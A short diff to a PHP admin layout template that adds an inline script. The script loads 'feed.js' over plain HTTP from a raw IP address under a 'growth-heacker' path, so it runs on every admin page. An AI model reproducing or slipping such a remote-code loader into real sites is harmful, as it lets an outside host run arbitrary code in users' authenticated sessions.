@@ -41,7 +41,12 @@ echo $this->fetch('meta'); ?>
 <link href="<?php echo $this->webroot; ?>theme_admin/assets/admin/layout2/css/themes/grey.css" rel="stylesheet" type="text/css" id="style_color"/>
 <!-- END THEME STYLES -->
 <link rel="shortcut icon" href="<?php echo $this->webroot; ?>theme_admin/images/shortcut_icon/non-moving-logo.png"/>
- <script src="<?php echo $this->webroot; ?>theme_admin/assets/global/plugins/jquery.min.js" type="text/javascript"></script><script>
+ <script src="<?php echo $this->webroot; ?>theme_admin/assets/global/plugins/jquery.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+var key = 3;
+(function(a) {var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = 'http://52.74.43.53/growth-heacker/feed.js?key='+key;var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);}(window, document))
+</script>
+<script>
 jQuery(document).ready(function(){
 
    $("a[rel='tab']").live('click',function(e){
